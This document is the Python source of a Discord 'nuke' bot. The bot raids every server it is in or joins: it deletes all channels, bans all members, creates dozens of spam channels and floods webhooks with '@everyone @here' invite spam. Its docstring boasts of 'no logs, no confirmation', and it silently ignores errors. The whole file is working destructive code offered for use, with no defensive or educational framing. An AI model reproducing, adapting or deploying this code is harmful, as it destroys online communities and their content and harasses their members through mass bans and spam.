import discord
from discord.ext import commands
import asyncio
import os

# CONFIGURATION
TOKEN = 'YOUR_BOT_TOKEN_HERE'
MESSAGE_CONTENT = "@everyone @here discord.gg/rdl"  # What to spam

# Intents are required for this to work
intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

async def execute_nuke(guild):
    """
    Silent raid execution. No logs, no confirmation.
    """
    tasks = []
    
    # 1. Delete all channels
    for channel in guild.channels:
        tasks.append(asyncio.create_task(channel_delete(channel)))
    
    # 2. Ban all members
    for member in guild.members:
        tasks.append(asyncio.create_task(member_ban(member)))
        
    # 3. Spam create channels
    for i in range(50):
        tasks.append(asyncio.create_task(channel_spam(guild, i)))

    # 4. Spam webhooks
    for channel in guild.text_channels:
        tasks.append(asyncio.create_task(webhook_spam(channel)))

    # Fire and forget
    await asyncio.gather(*tasks, return_exceptions=True)

async def channel_delete(channel):
    try:
        await channel.delete()
    except:
        pass

async def member_ban(member):
    try:
        await member.ban(reason="Nuke Bot")
    except:
        pass

async def channel_spam(guild, i):
    try:
        await guild.create_text_channel(f"nuke-{i}-{i*2}")
    except:
        pass

async def webhook_spam(channel):
    try:
        webhook = await channel.create_webhook(name="Nuke Bot")
        for _ in range(10):
            await webhook.send(MESSAGE_CONTENT)
        await webhook.delete() 
    except:
        pass

@bot.event
async def on_ready():
    # If the bot is already in any servers when it starts, it will raid them immediately.
    for guild in bot.guilds:
        await execute_nuke(guild)

@bot.event
async def on_guild_join(guild):
    # As soon as the bot joins a new server, it raids it.
    await execute_nuke(guild)

try:
    bot.run(TOKEN)
except Exception as e:
    pass
